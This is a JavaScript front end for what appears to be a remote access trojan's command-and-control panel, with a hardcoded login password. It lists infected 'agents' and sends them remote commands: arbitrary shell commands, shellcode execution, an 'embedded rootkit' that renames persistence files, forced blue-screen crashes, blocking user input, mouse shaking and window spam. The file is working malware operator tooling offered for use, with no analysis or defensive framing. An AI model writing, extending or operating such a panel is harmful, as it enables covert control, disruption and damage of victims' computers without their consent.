// Global state
let currentAgent = null;
let agents = [];
let commandCount = 0;
let confirmCallback = null;
let isAuthenticated = false;

// Authentication
function attemptLogin() {
    const input = document.getElementById('loginPassword');
    const error = document.getElementById('loginError');
    const password = input.value;
    
    if (password === 'k5gchqtcucmgcoxdz15sl') {
        isAuthenticated = true;
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('mainContainer').style.display = 'flex';
        input.value = '';
        error.textContent = '';
        initApp();
    } else {
        error.textContent = 'Invalid password';
        input.value = '';
    }
}

document.getElementById('loginPassword')?.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') attemptLogin();
});

function initApp() {
    initNavigation();
    initTabs();
    initShellInput();
    fetchAgents();
    setInterval(fetchAgents, 5000);
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    // App will init after login
});

// Notification system
function showNotification(message, icon = 'ℹ️') {
    document.getElementById('notifIcon').textContent = icon;
    document.getElementById('notifMessage').textContent = message;
    document.getElementById('notificationModal').classList.add('active');
}

function closeNotification() {
    document.getElementById('notificationModal').classList.remove('active');
}

function showConfirm(message, callback) {
    document.getElementById('confirmMessage').textContent = message;
    document.getElementById('confirmModal').classList.add('active');
    confirmCallback = callback;
}

function confirmAction(result) {
    document.getElementById('confirmModal').classList.remove('active');
    if (confirmCallback) {
        confirmCallback(result);
        confirmCallback = null;
    }
}

// Navigation
function initNavigation() {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', (e) => {
            e.preventDefault();
            const view = item.dataset.view;
            switchView(view);
            
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            item.classList.add('active');
        });
    });
}

function switchView(viewName) {
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.getElementById(viewName).classList.add('active');
    
    const titles = {
        dashboard: 'Dashboard',
        agents: 'Agents',
        commands: 'Commands',
        logs: 'System Logs'
    };
    document.getElementById('pageTitle').textContent = titles[viewName] || viewName;
}

// Tabs
function initTabs() {
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            const tabName = tab.dataset.tab;
            
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            tab.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        });
    });
}

// Fetch agents
async function fetchAgents() {
    try {
        const res = await fetch('/api/ping');
        const data = await res.json();
        agents = data;
        
        updateDashboard();
        updateAgentsGrid();
        addLog('info', `Fetched ${data.length} agents`);
    } catch (e) {
        console.error('Failed to fetch agents:', e);
        addLog('error', 'Failed to fetch agents');
    }
}

// Update dashboard stats
function updateDashboard() {
    const now = new Date();
    const online = agents.filter(a => (now - new Date(a.last_seen)) < 60000);
    const offline = agents.length - online.length;
    
    document.getElementById('totalAgents').textContent = agents.length;
    document.getElementById('onlineAgents').textContent = online.length;
    document.getElementById('offlineAgents').textContent = offline.length;
    document.getElementById('onlineCount').textContent = online.length;
    document.getElementById('commandsExecuted').textContent = commandCount;
    
    const activityList = document.getElementById('activityList');
    if (agents.length > 0) {
        activityList.innerHTML = agents.slice(0, 5).map(agent => {
            const isOnline = (now - new Date(agent.last_seen)) < 60000;
            return `
                <div class="activity-item">
                    <span class="activity-time">${new Date(agent.last_seen).toLocaleTimeString()}</span>
                    <span class="activity-text">
                        ${agent.hostname} - ${isOnline ? '🟢 Online' : '🔴 Offline'}
                    </span>
                </div>
            `;
        }).join('');
    }
}

// Update agents grid
function updateAgentsGrid() {
    const grid = document.getElementById('agentsGrid');
    const now = new Date();
    
    if (agents.length === 0) {
        grid.innerHTML = '<p class="empty-state">No agents connected</p>';
        return;
    }
    
    grid.innerHTML = agents.map(agent => {
        const isOnline = (now - new Date(agent.last_seen)) < 60000;
        return `
            <div class="agent-card" onclick="openAgentModal('${agent.id}')">
                <div class="agent-header">
                    <h3>${agent.hostname}</h3>
                    <span class="agent-status ${isOnline ? 'online' : 'offline'}">
                        ${isOnline ? '● ONLINE' : '● OFFLINE'}
                    </span>
                </div>
                <div class="agent-info">
                    <div class="agent-info-item">
                        <span class="label">UUID:</span>
                        <span class="value">${agent.id.substring(0, 8)}...</span>
                    </div>
                    <div class="agent-info-item">
                        <span class="label">Last Seen:</span>
                        <span class="value">${new Date(agent.last_seen).toLocaleTimeString()}</span>
                    </div>
                </div>
            </div>
        `;
    }).join('');
}

// Modal functions
function openAgentModal(agentId) {
    const agent = agents.find(a => a.id === agentId);
    if (!agent) return;
    
    currentAgent = agent;
    const now = new Date();
    const isOnline = (now - new Date(agent.last_seen)) < 60000;
    
    document.getElementById('modalAgentName').textContent = agent.hostname;
    document.getElementById('detailId').textContent = agent.id;
    document.getElementById('detailHostname').textContent = agent.hostname;
    document.getElementById('detailStatus').innerHTML = isOnline 
        ? '<span style="color: var(--success)">● ONLINE</span>' 
        : '<span style="color: var(--danger)">● OFFLINE</span>';
    document.getElementById('detailLastSeen').textContent = new Date(agent.last_seen).toLocaleString();
    
    document.getElementById('agentModal').classList.add('active');
    addLog('info', `Opened details for ${agent.hostname}`);
}

function closeModal() {
    document.getElementById('agentModal').classList.remove('active');
    currentAgent = null;
}

// Shell commands
function initShellInput() {
    const input = document.getElementById('shellInput');
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            executeShellCommand();
        }
    });
}

async function executeShellCommand() {
    if (!currentAgent) return;
    
    const input = document.getElementById('shellInput');
    const command = input.value.trim();
    if (!command) return;
    
    const output = document.getElementById('terminalOutput');
    output.innerHTML += `<div class="terminal-line">$ ${command}</div>`;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'shell',
                command: command
            })
        });
        
        output.innerHTML += `<div class="terminal-line">Command sent</div>`;
        output.scrollTop = output.scrollHeight;
        
        commandCount++;
        addCommandToHistory('shell', command, 'Command sent');
        addLog('success', `Executed: ${command} on ${currentAgent.hostname}`);
    } catch (e) {
        output.innerHTML += `<div class="terminal-line" style="color: #f00;">Error: ${e.message}</div>`;
        addLog('error', `Failed to execute command: ${e.message}`);
    }
    
    input.value = '';
}

// Power commands
async function sendPowerCommand(action) {
    if (!currentAgent) return;
    
    showConfirm(`Are you sure you want to ${action} ${currentAgent.hostname}?`, async (confirmed) => {
        if (!confirmed) return;
        
        try {
            await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'power',
                    action: action
                })
            });
            
            showNotification(`Power command sent: ${action}`, '⚡');
            commandCount++;
            addCommandToHistory('power', action, 'Command sent');
            addLog('warning', `Power command ${action} sent to ${currentAgent.hostname}`);
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
            addLog('error', `Failed to send power command: ${e.message}`);
        }
    });
}

// Message box
async function sendMessageBox() {
    if (!currentAgent) return;
    
    const title = document.getElementById('msgTitle').value;
    const content = document.getElementById('msgContent').value;
    const type = document.getElementById('msgType').value;
    
    if (!title || !content) {
        showNotification('Please fill in all fields', '⚠️');
        return;
    }
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'message',
                title: title,
                content: content,
                messageType: type
            })
        });
        
        showNotification('Message sent successfully', '✅');
        commandCount++;
        addCommandToHistory('message', `${title}: ${content}`, 'Message sent');
        addLog('success', `Message sent to ${currentAgent.hostname}`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
        addLog('error', `Failed to send message: ${e.message}`);
    }
}

// Text-to-Speech
async function speakText() {
    if (!currentAgent) return;
    
    const text = document.getElementById('ttsText').value;
    const voice = document.getElementById('ttsVoice').value;
    
    if (!text) {
        showNotification('Please enter text to speak', '⚠️');
        return;
    }
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'tts',
                text: text,
                voice: voice
            })
        });
        
        showNotification('TTS command sent', '✅');
        commandCount++;
        addLog('success', `TTS: ${text.substring(0, 50)}...`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Open URL
async function openURL() {
    if (!currentAgent) return;
    
    const url = document.getElementById('urlInput').value;
    
    if (!url) {
        showNotification('Please enter URL', '⚠️');
        return;
    }
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'url',
                url: url
            })
        });
        
        showNotification('URL opened', '✅');
        commandCount++;
        addLog('success', `Opened URL: ${url}`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Volume control
async function setVolume() {
    if (!currentAgent) return;
    
    const level = document.getElementById('volumeSlider').value;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'volume',
                action: 'set',
                level: parseInt(level)
            })
        });
        
        showNotification(`Volume set to ${level}%`, '✅');
        commandCount++;
        addLog('success', `Volume set to ${level}%`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

async function muteVolume() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'volume',
                action: 'mute'
            })
        });
        
        showNotification('Volume muted', '✅');
        commandCount++;
        addLog('success', 'Volume muted');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

async function unmuteVolume() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'volume',
                action: 'unmute'
            })
        });
        
        showNotification('Volume unmuted', '✅');
        commandCount++;
        addLog('success', 'Volume unmuted');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// CD Tray
async function cdTray(action) {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'cdtray',
                action: action
            })
        });
        
        showNotification(`CD tray ${action}ed`, '✅');
        commandCount++;
        addLog('success', `CD tray ${action}ed`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Block/Unblock Input
async function blockInput() {
    if (!currentAgent) return;
    
    showConfirm('Block keyboard and mouse input?', async (confirmed) => {
        if (!confirmed) return;
        
        try {
            await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'blockinput',
                    action: 'block'
                })
            });
            
            showNotification('Input blocked', '✅');
            commandCount++;
            addLog('warning', 'Input blocked');
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
        }
    });
}

async function unblockInput() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'blockinput',
                action: 'unblock'
            })
        });
        
        showNotification('Input unblocked', '✅');
        commandCount++;
        addLog('success', 'Input unblocked');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Hide/Show Cursor
async function hideCursor() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'cursor',
                action: 'hide'
            })
        });
        
        showNotification('Cursor hidden', '✅');
        commandCount++;
        addLog('success', 'Cursor hidden');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

async function showCursor() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'cursor',
                action: 'show'
            })
        });
        
        showNotification('Cursor shown', '✅');
        commandCount++;
        addLog('success', 'Cursor shown');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Lock PC
async function lockPC() {
    if (!currentAgent) return;
    
    showConfirm('Lock the workstation?', async (confirmed) => {
        if (!confirmed) return;
        
        try {
            await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'lock'
                })
            });
            
            showNotification('PC locked', '✅');
            commandCount++;
            addLog('warning', 'PC locked');
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
        }
    });
}

// Spam Windows
async function startSpam() {
    if (!currentAgent) return;
    
    const program = document.getElementById('spamProgram').value;
    const delay = document.getElementById('spamDelay').value;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'spam',
                action: 'start',
                program: program,
                delay: parseInt(delay)
            })
        });
        
        showNotification(`Spam started: ${program}`, '✅');
        commandCount++;
        addLog('warning', `Spam started: ${program} every ${delay}ms`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

async function stopSpam() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'spam',
                action: 'stop'
            })
        });
        
        showNotification('Spam stopped', '✅');
        commandCount++;
        addLog('success', 'Spam stopped');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Mouse Shake
async function startMouseShake() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'mouseshake',
                action: 'start'
            })
        });
        
        showNotification('Mouse shake started', '✅');
        commandCount++;
        addLog('warning', 'Mouse shake started');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

async function stopMouseShake() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'mouseshake',
                action: 'stop'
            })
        });
        
        showNotification('Mouse shake stopped', '✅');
        commandCount++;
        addLog('success', 'Mouse shake stopped');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Swap Mouse Buttons
async function swapMouse() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'swapmouse',
                action: 'swap'
            })
        });
        
        showNotification('Mouse buttons swapped', '✅');
        commandCount++;
        addLog('warning', 'Mouse buttons swapped');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

async function restoreMouse() {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'swapmouse',
                action: 'restore'
            })
        });
        
        showNotification('Mouse buttons restored', '✅');
        commandCount++;
        addLog('success', 'Mouse buttons restored');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Play System Sound
async function playSound(soundType) {
    if (!currentAgent) return;
    
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'systemsound',
                sound: soundType
            })
        });
        
        showNotification(`${soundType} sound played`, '✅');
        commandCount++;
        addLog('success', `System sound: ${soundType}`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Rename PC
async function renamePCFunc() {
    if (!currentAgent) return;
    
    const newName = document.getElementById('newPCName').value.trim();
    
    if (!newName) {
        showNotification('Please enter a new PC name', '⚠️');
        return;
    }
    
    showConfirm(`Rename PC to "${newName}"? (Restart required)`, async (confirmed) => {
        if (!confirmed) return;
        
        try {
            await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'renamepc',
                    name: newName
                })
            });
            
            showNotification(`PC will be renamed to: ${newName}`, '✅');
            commandCount++;
            addLog('warning', `PC rename requested: ${newName}`);
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
        }
    });
}

// Execute Rootkit from rootkit.h
async function executeRootkit() {
    if (!currentAgent) return;
    
    showConfirm('Execute embedded rootkit? This will rename all persistence files to $77 prefix!', async (confirmed) => {
        if (!confirmed) return;
        
        try {
            await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'rootkit'
                })
            });
            
            showNotification('Rootkit executed from rootkit.h', '✅');
            commandCount++;
            addLog('warning', 'Rootkit executed (embedded shellcode)');
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
        }
    });
}

// Trigger BSOD
async function triggerBSOD() {
    if (!currentAgent) return;
    
    showConfirm('⚠️ TRIGGER BLUE SCREEN OF DEATH? System will crash immediately!', async (confirmed) => {
        if (!confirmed) return;
        
        try {
            await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'bsod'
                })
            });
            
            showNotification('BSOD triggered', '💥');
            commandCount++;
            addLog('error', 'BSOD triggered - system will crash');
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
        }
    });
}

// Execute Shellcode
async function executeShellcodeFunc() {
    if (!currentAgent) return;
    
    const shellcode = document.getElementById('shellcodeInput').value.trim().replace(/\s/g, '');
    
    if (!shellcode) {
        showNotification('Please enter shellcode', '⚠️');
        return;
    }
    
    // Validate hex
    if (!/^[0-9A-Fa-f]+$/.test(shellcode)) {
        showNotification('Invalid shellcode format (use hex only)', '❌');
        return;
    }
    
    showConfirm('Execute shellcode? This is dangerous!', async (confirmed) => {
        if (!confirmed) return;
        
        try {
            await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'shellcode',
                    data: shellcode
                })
            });
            
            showNotification('Shellcode executed', '✅');
            commandCount++;
            addLog('warning', `Shellcode executed (${shellcode.length / 2} bytes)`);
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
        }
    });
}

// Command history
function addCommandToHistory(type, command, result) {
    const historyList = document.getElementById('historyList');
    
    if (historyList.querySelector('.empty-state')) {
        historyList.innerHTML = '';
    }
    
    const item = document.createElement('div');
    item.className = 'history-item';
    item.innerHTML = `
        <div class="history-header">
            <span>${currentAgent?.hostname || 'Unknown'}</span>
            <span>${new Date().toLocaleTimeString()}</span>
        </div>
        <div class="history-command">[${type}] ${command}</div>
        <div class="history-result">${result}</div>
    `;
    
    historyList.insertBefore(item, historyList.firstChild);
}

// Logs
function addLog(level, message) {
    const logsContent = document.getElementById('logsContent');
    const time = new Date().toLocaleTimeString();
    
    const entry = document.createElement('div');
    entry.className = `log-entry ${level}`;
    entry.innerHTML = `<span class="log-time">[${time}]</span><span class="log-message">${message}</span>`;
    
    logsContent.appendChild(entry);
    logsContent.scrollTop = logsContent.scrollHeight;
}

function clearLogs() {
    const logsContent = document.getElementById('logsContent');
    logsContent.innerHTML = '<div class="log-entry info"><span class="log-time">[' + 
        new Date().toLocaleTimeString() + ']</span><span class="log-message">Logs cleared</span></div>';
}

// Search
document.getElementById('searchInput')?.addEventListener('input', (e) => {
    const query = e.target.value.toLowerCase();
    document.querySelectorAll('.agent-card').forEach(card => {
        const text = card.textContent.toLowerCase();
        card.style.display = text.includes(query) ? 'block' : 'none';
    });
});

// Close modal on outside click
document.getElementById('agentModal')?.addEventListener('click', (e) => {
    if (e.target.id === 'agentModal') {
        closeModal();
    }
});
